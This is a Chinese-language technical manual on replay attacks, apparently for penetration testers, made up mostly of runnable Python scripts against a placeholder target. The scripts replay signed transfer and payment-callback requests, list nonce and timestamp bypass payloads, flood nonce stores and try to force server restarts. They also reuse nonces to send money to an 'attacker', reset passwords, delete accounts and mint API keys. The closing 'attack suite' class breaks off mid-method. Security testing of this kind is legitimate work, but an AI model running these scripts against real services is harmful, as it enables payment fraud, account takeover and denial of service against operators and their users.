# Replay / Nonce / Timestamp — 重放攻击深度技术手册

> 一个合法的签名，如果可以被重复使用，就不再是签名。重放攻击的核心是：**信任上下文已经变更，但验证逻辑没有检查变更**。

## 0. 攻击全景

```
重放攻击分类
├── 纯重放 (Replay Without Modification)
│   ├── 同一请求重复发送
│   ├── 跨用户重放
│   ├── 跨上下文重放 (同一请求不同场景)
│   └── 时序重放 (过期后仍有效)
├── Nonce 绕过
│   ├── 缺失 nonce
│   ├── 空 / null nonce
│   ├── 静态 nonce / 重复使用
│   ├── Nonce 预测 (递增/时间戳/weak random)
│   ├── Nonce 数组绕过 (PHP/Python 特性)
│   └── Nonce 耗尽
├── Timestamp 操纵
│   ├── 未来时间戳
│   ├── Epoch 0 / 负数
│   ├── 已过期仍接受
│   └── 时钟偏差利用
└── 窗口攻击
    ├── N 秒窗口内重放
    ├── 并发窗口 (竞态)
    └── 窗口调整攻击
```

## 1. 纯重放攻击

### 1.1 基础重放

```python
# replay_basic.py — 最基本的重放攻击
import requests

BASE = "https://target"
S = requests.Session()

# Step 1: 截获一个合法请求
original_req = {
    "method": "POST",
    "url": "/api/transfer",
    "body": {
        "from": "user_a",
        "to": "user_b",
        "amount": 100,
        "sign": "abc123def456...",     # 合法签名
        "nonce": "NONCE_001",
        "ts": 1700000000,
    }
}

# Step 2: 原样重放
r1 = S.post(BASE + original_req["url"], json=original_req["body"])
print(f"[1st] {r1.status_code} | {r1.text[:200]}")

# Step 3: 再次重放
r2 = S.post(BASE + original_req["url"], json=original_req["body"])
print(f"[2nd] {r2.status_code} | {r2.text[:200]}")

# 如果两次都成功 → 无 nonce 防护 / nonce 未检查
if r1.status_code == 200 and r2.status_code == 200:
    print("[!] VULNERABLE: Replay without protection!")
```

### 1.2 跨用户重放

```python
# 场景: 用户 A 的重置密码链接发给用户 B
"""
链接: https://target/reset-password?token=MD5(user_a_secret+timestamp)
如果签名不绑定用户，用户 B 可以用用户 A 的 token 重置自己的密码
"""

def cross_user_replay():
    """跨用户重放检测"""
    # 抓取用户 A 的请求
    req_a = {
        "url": "/api/activate_vip",
        "body": {
            "user_id": "user_a",
            "plan": "premium",
            "sign": "a1b2c3d4..."  # 用户 A 的签名
        }
    }
    
    # 换用户 B 的 session 重放
    session_b = requests.Session()
    session_b.cookies["session"] = "SESSION_B"
    
    r = session_b.post(BASE + req_a["url"], json=req_a["body"])
    
    # 如果用户 B 的资源/状态变了 → 跨用户重放
    if "vip" in r.text.lower() or "premium" in r.text.lower():
        print("[!] Cross-user replay: user B got user A's entitlement!")
    
    # 同样思路: 跨角色重放
    # 普通用户的签名 → 管理员重放
    # 测试环境的签名 → 生产环境重放
```

### 1.3 跨上下文重放

```python
"""
同一次支付回调被多次处理：
    1. 取消订单的回调 → 重放 → 订单再次被取消
    2. 退款回调 → 重放 → 多次退款
    3. 发货回调 → 重放 → 多次发货
    
核心: 回调处理不是幂等的（或不是完全幂等的）
"""

def replay_cross_context(order_id: str):
    """跨上下文重放攻击"""
    callbacks = [
        # 同一个回调 payload 发给不同的 endpoint
        {"url": "/notify", "status": "success"},
        {"url": "/callback", "status": "success"},
        {"url": "/webhook", "status": "success"},
        {"url": "/api/payment/notify", "status": "success"},
        
        # 给不同的参数名
        {"status_field": "trade_status", "value": "TRADE_SUCCESS"},
        {"status_field": "pay_result", "value": "success"},
        {"status_field": "status", "value": "paid"},
        
        # 调换参数位置
        {"order_id": order_id, "sign": "...", "amount": "0.01", "status": "paid"},
        {"sign": "...", "amount": "0.01", "order_id": order_id, "status": "paid"},
    ]
    
    for i, cb in enumerate(callbacks):
        r = S.post(BASE + cb.get("url", "/api/payment/notify"), json=cb, timeout=10)
        # 如果同一个 order 被重复处理 → 漏洞
        print(f"[{i}] {r.status_code} | {r.text[:150]}")
```

## 2. Nonce 预测

### 2.1 递增 Nonce

```python
# nonce_prediction.py — Nonce 预测攻击
import requests, json, time, re

BASE = "https://target"
S = requests.Session()

def predict_sequential_nonce():
    """
    情景: nonce 是递增整数
    观察: nonce=1, nonce=2, nonce=3 ...
    攻击: 预先算好未来 nonce 的签名，或直接重用过去的 nonce
    """
    nonces_seen = []
    
    # 收集 5 个 nonce 样本
    for _ in range(5):
        r = S.post(BASE + "/api/get_nonce", json={}, timeout=10)
        nonce = r.json().get("nonce")
        print(f"[*] Got nonce: {nonce} (type={type(nonce).__name__})")
        nonces_seen.append(nonce)
        time.sleep(0.1)
    
    # 分析模式
    if all(isinstance(n, int) for n in nonces_seen):
        diffs = [nonces_seen[i+1] - nonces_seen[i] for i in range(len(nonces_seen)-1)]
        if all(d == 1 for d in diffs):
            print("[!] NONCE IS SEQUENTIAL (+1)")
            return "sequential_increment"
        elif len(set(diffs)) == 1:
            print(f"[!] NONCE HAS FIXED STEP: {diffs[0]}")
            return "fixed_step"
        else:
            print(f"[*] Nonce differences: {diffs}")
            
    elif all(isinstance(n, str) and n.isdigit() for n in nonces_seen):
        print("[!] Nonce is numeric string, likely sequential")
        return "numeric_string"
    
    return "unknown"


def exploit_sequential_nonce():
    """利用递增 nonce 做重放攻击"""
    # Step 1: 获取当前 nonce
    r = S.post(BASE + "/api/get_nonce")
    current_nonce = r.json().get("nonce")
    
    # Step 2: 用当前 nonce 签名请求
    r = S.post(BASE + "/api/transfer", json={
        "to": "attacker",
        "amount": 1000,
        "nonce": current_nonce,
        "sign": "..."
    })
    
    # Step 3: 预测下一 nonce 并重放（如果服务端签完就标记 nonce 已用）
    # 但如果 nonce 验证在签名之前，我们可以：
    # - 同时用 nonce=current_nonce 发大量请求（竞态）
    # - 用 nonce=current_nonce+1 伪造请求（如果签名的 nonce 也是客户端生成）
    
    next_nonce = current_nonce + 1 if isinstance(current_nonce, int) else int(current_nonce) + 1
    print(f"[*] Predicted next nonce: {next_nonce}")
    
    # 如果签名是 MD5(secret + nonce + data)，可以预计算未来 nonce 的签名
    # 但这需要知道 secret（长度扩展攻击）或 secret 本身就是 nonce（弱）
```

### 2.2 时间戳 Nonce

```python
def analyze_time_based_nonce():
    """
    分析 nonce 是否基于时间
    
    常见模式:
    - timestamp_ms: 1700000000123 (微妙级)
    - date_str: "20240101120000"
    - base64(ts): "MTcwMDAwMDAwMA=="
    - hash(timestamp): MD5(str(time.time()))
    """
    nonces = []
    timestamps = []
    
    for _ in range(10):
        r = S.post(BASE + "/api/nonce", json={})
        data = r.json()
        nonces.append(data.get("nonce"))
        timestamps.append(time.time())
    
    import base64
    for i, (nonce, ts) in enumerate(zip(nonces, timestamps)):
        ts_int = int(ts)
        
        # 检查 nonce 是否等于 timestamp
        if isinstance(nonce, int):
            diff = abs(nonce - ts_int * 1000)  # 毫秒
            if diff < 10000:  # 10 秒内
                print(f"[!] Nonce = timestamp(ms) diff={diff}ms")
                return "timestamp_ms"
            
            diff_s = abs(nonce - ts_int)
            if diff_s < 10:  # 秒
                print(f"[!] Nonce = timestamp(s) diff={diff_s}s")
                return "timestamp_s"
        
        # 检查 base64 解码
        if isinstance(nonce, str):
            try:
                decoded = base64.b64decode(nonce)
                if decoded.isdigit():
                    ts_decoded = int(decoded)
                    if abs(ts_decoded - ts_int * 1000) < 10000:
                        print(f"[!] Nonce = base64(timestamp_ms)")
                        return "b64_timestamp_ms"
            except:
                pass
    
    return "unknown"
```

### 2.3 弱随机 Nonce

```python
def predict_weak_random_nonce():
    """
    攻击弱随机数生成器
    
    可预测的随机源:
    - Math.random() in JS (XorShift128+)
    - rand() in PHP (LCG) 
    - random.randint in Python (Mersenne Twister, 624 连续值可预测)
    - java.util.Random (LCG, 2^48 状态)
    """
    
    # PHP rand() 和 Python random 的差异:
    # PHP rand() 是 LCG: seed = (seed * A + C) % M
    # 如果拿到连续 2 个值可以恢复大部分实现的状态
    
    nonces = []
    for _ in range(1000):  # 收集足够样本
        r = S.post(BASE + "/api/nonce", json={})
        nonces.append(r.json().get("nonce"))
    
    # 检查单调性
    # 弱随机数在"重启"后种子相同 → 每次启动后 nonce 序列相同
    # 重启攻击: 重启页面/容器 → 新的 nonce 序列可预测
    
    # 测试: 如果 nonce 是整数且序列在每次 login/start 从同一值开始
    first_ten = nonces[:10]
    if first_ten == [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:
        print("[!] Nonce always starts from 1 (resets on session)")
    
    # Mersenne Twister 恢复
    # 如果知道系统使用 Python random，收集 624 个整数 → 可完全恢复状态
    if len(set(nonces)) > 100:
        print(f"[*] Nonce seems random, checking if MT19937...")
        # 实际 MT 恢复需要更复杂的处理，这里仅做检测
```

## 3. Nonce 绕过

### 3.1 缺失 / null / 空 nonce

```python
# nonce_bypass.py — Nonce 绕过测试
import requests, json

BASE = "https://target"
S = requests.Session()

NONCE_BYPASS_PAYLOADS = {
    # 完全缺失
    "missing": {},                                      # 不传 nonce 字段
    
    # null / None (JSON)
    "null_json": {"nonce": None},                       # JSON null
    "null_string": {"nonce": "null"},                   # 字符串 "null"
    "undefined": {"nonce": "undefined"},                # JS undefined 字符串
    
    # 空值
    "empty_string": {"nonce": ""},                      # 空字符串
    "empty_array": {"nonce": []},                        # 空数组 []
    "empty_object": {"nonce": {}},                       # 空对象 {}
    
    # 零值
    "zero_int": {"nonce": 0},                           # 整数 0
    "zero_float": {"nonce": 0.0},                       # 浮点 0.0
    "zero_string": {"nonce": "0"},                       # 字符串 "0"
    "false_bool": {"nonce": False},                     # Boolean false
    
    # 固定值
    "fixed_once": {"nonce": "once"},                    # 特殊字符串
    "same_as_last": {"nonce": "LAST_SEEN_NONCE"},       # 重复使用
    "predicted": {"nonce": "PREDICTED_NEXT"},           # 预测值
    
    # PHP 特色
    "php_array": {"nonce[0]": "x", "nonce[1]": "y"},    # PHP 数组
    "php_null": {"nonce": None},                         # PHP null === 未设置
    
    # Python/Node 特色
    "python_none": {"nonce": None},
    "js_undefined": {"nonce": "undefined"},
    
    # 类型混淆
    "bool_true": {"nonce": True},                        # True == 1
    "neg_one": {"nonce": -1},                            # 负数
    "very_large": {"nonce": 9999999999999},              # 超大数
    "float_nan": {"nonce": float("nan")},                # NaN
}

def test_nonce_bypass(endpoint: str, base_payload: dict):
    """测试所有 nonce 绕过方式"""
    for label, extra in NONCE_BYPASS_PAYLOADS.items():
        payload = {**base_payload, **extra}
        
        # 如果 extra 是 None（不传 nonce）
        if label == "missing":
            payload.pop("nonce", None)
        
        try:
            r = S.post(BASE + endpoint, json=payload, timeout=10)
            body = r.text.lower()
            
            # 检查成功条件
            if r.status_code == 200 and "error" not in body and "invalid" not in body:
                print(f"[!] NONCE BYPASS: {label}")
                print(f"    Payload: {json.dumps(payload)[:200]}")
                print(f"    Response: {r.status_code} | {r.text[:200]}")
                print("    ---")
        
        except Exception as e:
            print(f"[!] Error on {label}: {e}")


def test_nonce_array_bypass(endpoint: str, sign_field: str = "sign"):
    """
    PHP 特色: nonce[]=x&nonce[]=y → nonce 被当作数组
    如果后端用 empty($data['nonce']) 检查，空数组 [] 是 empty!
    
    Python 特色: nonce=["a","b","c"] → 某些框架 ['a','b','c'] != 'a'
    不会等于之前记录的单一 nonce → 永远是"新的"
    """
    
    array_payloads = [
        ["nonce", []],                                      # 空数组
        ["nonce", [None]],                                   # [null]
        ["nonce", [""]],                                     # [""]
        ["nonce[0]", "fake"],                                # PHP 风格
        ["nonce", ["x", "y", "z"]],                          # 多元素数组
        ["nonce", {"a": "b"}],                               # 对象/关联数组
        ["nonce", [[]]],                                     # 嵌套数组
    ]
    
    # 发送方法取决于 payload 结构
    for field, value in array_payloads:
        if isinstance(field, list):  # 多字段
            payload = {"order_id": "ORDER_1", sign_field: "test"}
            for f in field:
                payload[f] = value
        else:
            payload = {"order_id": "ORDER_1", sign_field: "test", field: value}
        
        r = S.post(BASE + endpoint, json=payload, timeout=10)
        if r.status_code == 200 and "error" not in r.text.lower():
            print(f"[!] ARRAY NONCE BYPASS: {field}={value}")
```

### 3.2 Nonce 重用 (Reuse)

```python
# nonce_reuse_attack.py — Nonce 重用场景

"""
Nonce 可能在不同上下文中被重复使用：
    1. 同一用户的不同请求之间
    2. 不同用户之间 (nonce 不绑定 user_id)
    3. 不同 endpoint 之间 (同一 nonce 可用于 login、transfer、admin 操作)
"""

def test_nonce_cross_domain():
    """测试 nonce 是否跨操作可重用"""
    
    # Step 1: 从某个 API 获取 nonce
    r = S.get(BASE + "/api/v1/public/status")
    nonce = r.json().get("nonce")
    print(f"[*] Got nonce from public endpoint: {nonce}")
    
    # Step 2: 用同一 nonce 签名敏感请求
    sensitive_endpoints = [
        "/api/v1/transfer",
        "/api/v1/admin/delete_user",
        "/api/v1/update_password",
        "/api/v1/cancel_order",
    ]
    
    for ep in sensitive_endpoints:
        payload = {
            "nonce": nonce,
            "ts": int(time.time()),
            # 其他参数...
        }
        r = S.post(BASE + ep, json=payload, timeout=10)
        print(f"  {ep}: {r.status_code} {'[!] ACCEPTED' if r.status_code == 200 else '[.] rejected'}")
```

### 3.3 Nonce 耗尽攻击

```python
# nonce_exhaustion.py — 耗尽 nonce 表

"""
如果服务端用数据库/内存存储已用 nonce：
    内存 → 重启清空，或者内存满后移除旧的
    数据库 → 容量有限，填满后可能不再检查
    
攻击:
    大量请求用不同的 nonce 填满 nonce 表
    之后新请求的 nonce 不会被检查 → 可以重放
"""

def exhaust_nonce_table(target_url: str, concurrent: int = 100, total: int = 10000):
    """耗尽 nonce 存储"""
    import concurrent.futures
    
    success_no_nonce_check = 0
    
    def send_with_nonce(nonce_val):
        nonlocal success_no_nonce_check
        try:
            r = S.post(target_url, json={
                "to": "attacker",
                "amount": 1,
                "nonce": f"exhaust_{nonce_val}",
                "sign": "..."
            }, timeout=10)
            return r.status_code
        except:
            return None
    
    # Step 1: 大量 unique nonce
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent) as ex:
        futs = [ex.submit(send_with_nonce, i) for i in range(total)]
        results = [f.result() for f in concurrent.futures.as_completed(futs)]
    
    # Step 2: 现在重放最早的 nonce
    r_replay = S.post(target_url, json={
        "to": "attacker",
        "amount": 1,
        "nonce": "exhaust_0",  # 已经用过的 nonce
        "sign": "..."
    })
    
    if r_replay.status_code == 200:
        print(f"[!] NONCE TABLE EXHAUSTED! First nonce accepted again.")
    
    # 更激进的：如果服务端用 SETNX（Redis），填满内存后 Redis 会 evict
    # 老的 nonce 被移除后就可以重用了
    
    # 或者：如果 nonce 表按时间清理（TTL），等待过期即可
    print(f"[*] Waiting for nonce TTL expiry...")
    time.sleep(3600)  # 等一小时（根据实际情况调整）
    
    # 重新发送
    r_replay2 = S.post(target_url, json={
        "to": "attacker",
        "amount": 1,
        "nonce": "exhaust_0",
        "sign": "..."
    })
    if r_replay2.status_code == 200:
        print(f"[!] NONCE TTL EXPIRED! Nonce accepted after wait.")
```

## 4. 时间戳操纵

### 4.1 时间戳绕过全矩阵

```python
# timestamp_attacks.py — 所有时间戳攻击
import requests, time, json, calendar
from datetime import datetime, timedelta

BASE = "https://target"
S = requests.Session()

TIMESTAMP_ATTACKS = {
    # 未来时间戳
    "future_10s": int(time.time()) + 10,
    "future_1h": int(time.time()) + 3600,
    "future_1d": int(time.time()) + 86400,
    "future_10y": int(time.time()) + 315360000,
    "future_100y": int(time.time()) + 3153600000,
    "future_max_int_32": 2147483647,   # 2038-01-19
    "future_max_int_64": 9223372036854775807,
    
    # 过去时间戳
    "past_10s": int(time.time()) - 10,
    "past_1h": int(time.time()) - 3600,
    "past_1d": int(time.time()) - 86400,
    "past_1y": int(time.time()) - 31536000,
    "past_10y": int(time.time()) - 315360000,
    
    # 特殊值
    "epoch_0": 0,                                    # 1970-01-01
    "epoch_1": 1,                                    # 下一秒
    "negative_1": -1,                                # 1969-12-31
    "negative_max": -2147483648,                      # 最小 32-bit signed
    "jan_1_2000": 946684800,                          # 2000-01-01
    "now": int(time.time()),
    
    # 字符串格式
    "str_now": str(int(time.time())),
    "str_epoch": "0",
    "str_negative": "-1",
    "empty_string": "",                               # 空字符串 → 可能用当前时间代替？
    "null": None,
    
    # HTTP 头中的时间
    "date_header_today": datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT"),
    "date_header_expired": "Mon, 01 Jan 1970 00:00:00 GMT",
    "date_header_future": "Mon, 01 Jan 2099 00:00:00 GMT",
}

def test_timestamp_manipulation(endpoint: str, base_payload: dict, ts_field: str = "ts"):
    """测试所有时间戳变体"""
    for label, ts in TIMESTAMP_ATTACKS.items():
        payload = {**base_payload, ts_field: ts}
        try:
            r = S.post(BASE + endpoint, json=payload, timeout=10)
            body = r.text.lower()
            
            if r.status_code == 200 and "error" not in body and "expired" not in body:
                print(f"[!] TIMESTAMP BYPASS: {label} = {ts}")
                print(f"    Response: {r.status_code} | {r.text[:200]}")
                print("    ---")
        except Exception as e:
            print(f"    Error {label}: {e}")
```

### 4.2 时区偏移攻击

```python
"""
时区攻击场景：
    1. 前端传 "2024-01-01T00:00:00Z" (UTC)，后端解析
    2. 如果在 UTC+8 时区，00:00 UTC = 08:00 CST
    3. 如果超时检查在 UTC+8 00:00，但订单在 UTC 00:00 创建 → 差 8 小时
    
实际案例：
    - 支付超时检查用服务器时间，订单创建用用户时间
    - 用户在 12/31 23:00 UTC-5 创建 → 服务器 01/01 04:00 UTC → 已经"过期"
    - 或者反之：用户在 01/01 01:00 UTC+8 创建 → 服务器 12/31 17:00 UTC → 未过期
"""

def timezone_attack():
    """时区偏移测试"""
    timezone_payloads = [
        # 时区字符串
        {"created_at": "2024-01-01T00:00:00+14:00"},   # 最东时区 (UTC+14)
        {"created_at": "2024-01-01T00:00:00-12:00"},   # 最西时区 (UTC-12)
        
        # 无时区 (可能被解析为本地时间)
        {"created_at": "2024-01-01T00:00:00"},          # 无时区
        {"created_at": "2024-01-01 00:00:00"},           # 空格分隔
        
        # 夏令时
        {"created_at": "2024-03-10T02:30:00-05:00"},    # DST 切换时刻
        
        # 闰秒
        {"created_at": "2016-12-31T23:59:60Z"},         # 闰秒
        
        # ISO 8601 变体
        {"created_at": "20240101T000000Z"},               # 紧凑格式
        {"created_at": "2024-W01-1T00:00:00Z"},           # 周格式
    ]
    
    for payload in timezone_payloads:
        r = S.post(BASE + "/api/order/create", json=payload, timeout=10)
        body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
        
        # 检查: 订单创建时间是否和预期一致
        actual = body.get("created_at") or body.get("data", {}).get("created_at")
        if actual:
            print(f"Input: {payload['created_at']:40s} → Actual: {actual}")

    # 超时测试: 用未来时区创建 → 服务器认为已创建很久
    # 如果超时时间是固定 15 分钟，时区偏移可能把"刚创建"变成"已创建 8 小时"
```

### 4.3 时间窗口竞态

```python
"""
窗口竞态：如果服务端接受 N 秒内的时间戳
    
典型案例：
    - 5 秒内有效 → 窗口内可以多次重放
    - nonce 检查在签名之后 → 窗口内同一 nonce 可重复使用
    - 异步处理 → 窗口重叠

攻击：
    1. 发出合法请求
    2. 在时间窗口内（5 秒）重放多次
    3. 如果 nonce 唯一性检查在签名验证之后，可能先验证签名成功后再发现 nonce 重复 → 但重放已执行
"""

def window_replay_bomb(endpoint: str, payload: dict, window_seconds: int = 5, count: int = 50):
    """时间窗口内并发重放"""
    import concurrent.futures, threading
    
    success = []
    lock = threading.Lock()
    
    def replay(i: int):
        try:
            r = S.post(BASE + endpoint, json=payload, timeout=10)
            if r.status_code == 200:
                with lock:
                    success.append(i)
            return i, r.status_code, r.text[:100]
        except Exception as e:
            return i, 0, str(e)
    
    # 在窗口内并发发送
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        futs = [ex.submit(replay, i) for i in range(count)]
        for f in concurrent.futures.as_completed(futs):
            result = f.result()
            print(f"  [{result[0]}] status={result[1]} | {result[2]}")
    
    print(f"\n[*] Success count: {len(success)} / {count}")
    if len(success) > 1:
        print(f"[!] WINDOW REPLAY: same request accepted {len(success)} times!")
```

## 5. 服务端 Nonce 存储问题

### 5.1 存储方式枚举

```python
"""
服务端 nonce 存储猜测：

存储方式        | 特征                         | 攻击
────────────────────────────────────────────────────────────────────
内存 Map        | 重启后 nonce 清空              | 触发重启
Redis SETNX     | 超时自动删除                   | 等过期
MySQL/PG 表     | 性能瓶颈，可能分批清理          | 耗尽连接
NoSQL (MongoDB) | 无 TTL 永不过期                | 填满
文件存储        | 慢，可能读写锁                  | 并发绕过
空（不存）      | 见 3.1 所有 nonce 都通过        | 直接重放
"""

def probe_nonce_storage():
    """探测 nonce 存储方式"""
    
    # Test 1: 重启攻击
    # 如果 nonce 在内存中，重启后清空 → 旧的 nonce 可以再用
    def test_restart_attack():
        """触发服务端重启后重放"""
        # 先获取一个 nonce 并使用
        r1 = S.post(BASE + "/api/transfer", json={
            "to": "user_b", "amount": 1, "nonce": "test_nonce_1"
        })
        
        # 尝试触发重启: 500 错误、内存泄漏、管理接口
        S.post(BASE + "/api/admin/restart")      # 如果有管理接口
        S.post(BASE + "/api/error/oom")          # 触发 OOM
        S.get(BASE + "/api/healthcheck")         # 看服务是否重启
        
        time.sleep(2)
        
        # 重放
        r2 = S.post(BASE + "/api/transfer", json={
            "to": "user_b", "amount": 1, "nonce": "test_nonce_1"
        })
        
        if r2.status_code == 200:
            print("[!] Nonce storage is in-memory (restart cleared it)")
    
    # Test 2: Nonce TTL
    def test_nonce_ttl():
        """测试 nonce 是否自动过期"""
        nonce = "ttl_test_nonce"
        r1 = S.post(BASE + "/api/transfer", json={
            "to": "user_b", "amount": 1, "nonce": nonce
        })
        
        # 等待: 1s, 5s, 10s, 30s, 60s, 300s
        for wait in [1, 5, 10, 30, 60, 300]:
            time.sleep(wait)
            r = S.post(BASE + "/api/transfer", json={
                "to": "user_b", "amount": 1, "nonce": nonce
            })
            if r.status_code == 200:
                print(f"[!] Nonce TTL ≈ {wait}s")
                return
        print("[*] Nonce does not expire (or TTL > 300s)")
    
    # Test 3: Redis flush
    def test_redis_flush():
        """如果 nonce 在 Redis 中且有 FLUSHDB 端点或可以触发"""
        # 大量填充 nonce 可能触发 Redis eviction
        for i in range(100000):
            S.post(BASE + "/api/transfer", json={
                "to": "user_b", "amount": 1, "nonce": f"mass_{i}"
            })
        
        # 检查最早的那个 nonce 能否重用
        r = S.post(BASE + "/api/transfer", json={
            "to": "user_b", "amount": 1, "nonce": "mass_0"
        })
        if r.status_code == 200:
            print("[!] Nonce storage evicted (Redis maxmemory?)")
    
    test_restart_attack()
```

### 5.2 Nonce 表溢出

```python
"""
非对称容量攻击：
    发送方能以极低成本生成 nonce（10000 req/s）
    服务器需要 O(n) 存储和检索
    
    当 nonce 表满后的行为：
        a) 拒绝新请求（DoS） ← 对我们也无益
        b) 删除旧的 nonce   ← 老的 nonce 可以重放
        c) 停止检查 nonce   ← 所有 nonce 都通过！ ← 最脆弱
        d) 概率检查         ← 部分重放可行
"""

def nonce_table_flood(endpoint: str, base_payload: dict, flood_count: int = 50000):
    """填充 nonce 表并观察溢出后行为"""
    
    # Phase 1: 洪水填充
    print(f"[*] Flooding nonce table with {flood_count} requests...")
    
    def flood_worker(start, end):
        s = requests.Session()
        for i in range(start, end):
            try:
                s.post(BASE + endpoint, json={
                    **base_payload,
                    "nonce": f"flood_{i}"
                }, timeout=5)
            except:
                pass
    
    # 并发填充
    import concurrent.futures
    workers = 20
    chunk = flood_count // workers
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [
            ex.submit(flood_worker, i * chunk, (i + 1) * chunk)
            for i in range(workers)
        ]
        concurrent.futures.wait(futs)
    
    print("[*] Flood done. Testing nonce replay...")
    
    # Phase 2: 测试重放
    # 最早的 nonce
    r_old = S.post(BASE + endpoint, json={
        **base_payload,
        "nonce": "flood_0"
    })
    print(f"  Earliest nonce: {r_old.status_code}")
    
    # 中间的 nonce
    r_mid = S.post(BASE + endpoint, json={
        **base_payload,
        "nonce": f"flood_{flood_count // 2}"
    })
    print(f"  Middle nonce:   {r_mid.status_code}")
    
    # 最近的 nonce
    r_recent = S.post(BASE + endpoint, json={
        **base_payload,
        "nonce": f"flood_{flood_count - 1}"
    })
    print(f"  Most recent:    {r_recent.status_code}")
    
    # 全新的 nonce
    r_new = S.post(BASE + endpoint, json={
        **base_payload,
        "nonce": "brand_new_nonce"
    })
    print(f"  Brand new:      {r_new.status_code}")
    
    if r_old.status_code == 200:
        print("[!] NONCE TABLE OVERFLOW: old nonce replayed!")
```

## 6. 跨请求 Nonce 重用

```python
# cross_request_nonce.py

"""
同一 nonce 在不同操作中重用：

可能场景：
    1. 整个 session 只分配一个 nonce
    2. 每个 endpoint 独立检查 nonce，但 nonce 不跨 endpoint 共享
    3. 读操作不消耗 nonce，写操作消耗
"""

def cross_operation_nonce_reuse():
    """测试 nonce 跨操作重用"""
    
    # Step 1: 获取一个 nonce（从任意 API）
    r = S.get(BASE + "/api/v1/config")
    nonce = r.json().get("nonce")
    print(f"[*] Got nonce: {nonce}")
    
    # Step 2: 用同一个 nonce 执行不同的写操作
    operations = [
        ("transfer", {"to": "attacker", "amount": 1000}),
        ("change_password", {"new_password": "hacked123"}),
        ("delete_account", {}),
        ("upgrade_vip", {"level": "premium"}),
        ("create_api_key", {"name": "evil_key"}),
    ]
    
    for op_name, op_params in operations:
        payload = {
            "nonce": nonce,
            "ts": int(time.time()),
            **op_params
        }
        # 需要加上签名（或者如果 nonce 在签名前检查，加上任意签名）
        payload["sign"] = "test_sign"
        
        r = S.post(BASE + f"/api/v1/{op_name}", json=payload, timeout=10)
        status = "[!] ACCEPTED" if r.status_code == 200 else "[.] rejected"
        print(f"  {op_name}: {r.status_code} {status}")
```

## 7. 完整攻击套件

```python
#!/usr/bin/env python3
# replay_attack_suite.py — 重放攻击完整套件
"""
完整攻击流程：
    1. 信息收集（端点发现、参数分析）
    2. Nonce 分析（模式检测、预测性评估）
    3. 时间戳测试（过期、未来、窗口）
    4. 并发重放（窗口内竞态）
    5. 存储耗尽（redis 填满 / 数据库溢出）
    6. 跨上下文重放
"""

import requests
import time
import json
import re
import hashlib
import concurrent.futures
import threading
import itertools
from typing import Optional, Dict, List, Any
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs


class ReplayAttackSuite:
    """重放攻击自动测试套件"""
    
    def __init__(self, base_url: str, session: requests.Session = None):
        self.base = base_url.rstrip("/")
        self.s = session or requests.Session()
        self.s.headers.update({"User-Agent": "ReplayAttackSuite/1.0"})
        self.findings = []
        self.collected_nonces = []
        self.collected_timestamps = []
        self.known_operations = {}  # {op_name: sample_payload}
    
    # ──────── 1. 信息收集 ────────
    
    def discover_nonce_endpoints(self, paths: list = None):
        """
        探查哪些端点使用 nonce 保护
        通过尝试不带 nonce 的请求 + 带 nonce 的请求对比
        """
        common = paths or [
            "/api/transfer", "/api/payment", "/api/order",
            "/api/withdraw", "/api/refund", "/api/vip/redeem",
            "/api/coupon", "/api/reward", "/api/register",
            "/api/login", "/api/change_password",
        ]
        
        for path in common:
            # 不带 nonce
            r1 = self.s.post(self.base + path, json={"test": 1}, timeout=10)
            # 带 nonce
            r2 = self.s.post(self.base + path, json={"test": 1, "nonce": "test"}, timeout=10)
            
            if r1.status_code != r2.status_code:
                print(f"[+] Nonce-protected: {path}")
                self.known_operations[path] = {"requires_nonce": True}
            elif r1.status_code == 200:
                print(f"[?] No nonce check: {path}")
                self.known_operations[path] = {"requires_nonce": False}
    
    def capture_sample_request(self, endpoint: str, method: str = "POST", sample_count: int = 10):
        """捕获样本请求"""
        captures = []
        for i in range(sample_count):
            r = self.s.request(method, self.base + endpoint, json={
                "amount": 100,
                "to": "user_b",
                "_t": int(time.time() * 1000)  # 防缓存
            }, timeout=10)
            
            if r.status_code == 200:
                data = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
                captures.append(data)
                print(f"[*] Sample {i}: {json.dumps(data)[:200]}")
            
            time.sleep(0.2)
        
        return captures
    
    # ──────── 2. Nonce 分析 ────────
    
    def analyze_nonce_pattern(self, nonces: list):
        """分析 nonce 模式"""
        if not nonces:
            return "no_nonce_data"
        
        patterns = []
        
        # 检查类型
        types = set(type(n) for n in nonces)
        patterns.append(f"types={types}")
        
        # 检查是否递增整数
        int_nonces = [n for n in nonces if isinstance(n, (int, float))]
        if int_nonces:
            diffs = [int_nonces[i+1] - int_nonces[i] for i in range(len(int_nonces)-1)]
            if all(d == diffs[0] for d in diffs):
                patterns.append(f"FIXED_STEP={diffs[0]}")
                if diffs[0] == 1:
                    patterns.append("SEQUENTIAL")
        
        # 检查时间戳模式
        now = time.time()
        if int_nonces:
            ts_diffs = [abs(n - now * (1000 if n > 1e12 else 1)) for n in int_nonces[:3]]
            if max(ts_diffs) < 3600:
                patterns.append("TIMESTAMP_BASED")
        
        # 检查是否 UUID
        str_nonces = [str(n) for n in nonces if isinstance(n, str)]
        uuid_pattern = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$')
        if str_nonces and all(uuid_pattern.match(n) for n in str_nonces):
            patterns.append("UUIDv4")
        
        # 检查 Base64 编码
        import base64
        b64_pattern = re.compile(r'^[A-Za-z0-9+/=]+$')
        for n in str_nonces:
            if b64_pattern.match(n):
                try:
                    decoded = base64.b64decode(n)
                    patterns.append(f"BASE64_DECODED={decoded[:16]}")
                except:
                    pass
        
        return " | ".join(patterns) if patterns else "unknown"

    # ──────── 3. 纯重放测试 ────────
    
    def test_plain_replay(self, endpoint: str, payload: dict, count: int = 5):
        """测试纯重放"""
        results = []
        
        print(f"\n[*] Plain replay test on {endpoint}")
        for i in range(count):
            r = self.s.post(self.base + endpoint, json=payload, timeout=10)
            results.append(r.status_code)
            print(f"  Replay #{i+1}: {r.status_code} | {r.text[:100]}")
        
        success_count = results.count(200)
        if success_count > 1:
            self.findings.append({
                "type": "plain_replay",
                "endpoint": endpoint,
